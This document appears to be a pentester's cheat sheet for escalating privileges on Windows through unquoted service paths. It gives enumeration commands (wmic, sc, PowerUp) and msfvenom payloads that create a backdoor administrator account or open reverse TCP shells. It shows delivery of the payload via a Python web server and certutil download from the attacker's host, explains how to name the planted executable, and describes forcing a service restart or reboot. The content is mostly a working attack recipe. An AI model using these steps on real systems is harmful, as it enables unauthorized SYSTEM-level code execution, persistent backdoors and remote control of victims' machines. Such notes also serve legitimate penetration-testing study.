
Vulnerable Service looks like : C:\Program Files\Vuln Service\service.exe

Safe : "C:\Program Files\Vuln Service\service.exe" also "C:\service.exe" safe

**In unquoted service path attack, If an attacker places a malicious payload at `C:\Program Files\malicious.exe` (provided they have write permissions to `C:\Program Files`), Windows will execute that malicious file instead of the legitimate service whenever the service starts or restarts. Because many services run with elevated system privileges, this allows the attacker to execute code as `NT AUTHORITY\SYSTEM`**

**Key requirements:** 

1. There has to be no quotes in the service executable file path, have to makesure there is a space in the file path.
2. Service path has to be writable
3. Service running as user with elevated privilege (like Administrator)

To identify service running as which user:

**Using Command prompt:**

`wmic service where name="<nameofservice>" get startname`

(or)

`sc qc <nameofservice>`

Look for the **`SERVICE_START_NAME`** field in the output. If it says `LocalSystem`, it runs with highest privileges

**Using Powershell:**

`Get-CimInstance Win32_Service -Filter "Name='<NameOfYourService>'" | Select-Object Name, StartName`

**Using Powerup:**

`Get-ServiceDetail -Name <NameOfYourService>`

**POWERUP**

`Import-Module .\PowerUp.ps1`             (powershell)

`Invoke-AllChecks`           (The primary command. It runs every enumeration check simultaneously and outputs a detailed risk report.)

(or)

`Get-UnquotedService`     (Specifically hunts down unquoted service paths.)

**Crafting payload:**

`msfvenom -p windows/adduser USER=backdoor_admin PASS=Password@123 -f exe > service.exe`          (it will create a new user, and add them into the administrator group after execution)

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe-service -o Vuln.exe`         (64-bit systems)

`msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe-service -o Vuln.exe`         (32-bit systems)

**Delivering the payload:**

`python3 -m http.server 8080`    (hosting python server to sharing the payload)

`certutil -urlcache -f http://<ip>:8080/service.exe`  (for getting the payload)

**Payload naming specification:**

- **If you place it in `C:\`**: The file **must** be named **`Program.exe`**.
    - Windows reads up to the first space: `C:\Program` -> appends `.exe` -> looks for `C:\Program.exe`.
- **If you place it in `C:\Program Files\`**: The file **must** be named **`Vuln.exe`**.
    - Windows reads past the first space, up to the second space: `C:\Program Files\Vuln` -> appends `.exe` -> looks for `C:\Program Files\Vuln.exe`

**Need to restart the service:**

```cmd
net stop "<NameOfYourService>"
net start "<NameOfYourService>"  (or)

sc stop <nameofyourservice>
sc start <nameofyourservice>
```

```powershell
Restart-Service -Name "NameofyourService"
```

**THE EDGE CASE**:

By default, standard low-privilege users are restricted from stopping or starting system services. To check if your current user group actually has the rights to restart a specific service, you can use the built-in Windows tool `accesschk` (from Sysinternals) or PowerUp.

**Using PowerUp to check permissions:**

```powershell
Get-ServiceDetail -Name "NameOfYourService"
```

Look at the **Permissions** section in the output. You need **`SERVICE_STOP`** and **`SERVICE_START`** rights. If you see those listed for your user group (e.g., `Builtin\Users`), you can restart it manually. If not, the start command will return an "Access is denied" error. 

**Restarting the Machine:**

If you face an "Access is denied" error when trying to stop/start the service, your next option is a system reboot. However, for a machine reboot to successfully trigger your payload, **two conditions must be met**: 

1. **The Service Start Type Must Be Automatic:** The service must be configured to start automatically when Windows boots. If it is set to "Manual", a reboot will not trigger it. You can check the start type using:

    `sc qc "NameOfYourService"`    (Look for `START_TYPE`. It must say `AUTO_START`)

2. **Your Account Must Have Reboot Privileges:** Standard users on a local workstation can usually restart the computer. However, on restricted enterprise systems or Remote Desktop servers, this permission is often stripped.

If you have the permission, you can force a restart from the command line:

```cmd
shutdown /r /t 0
```
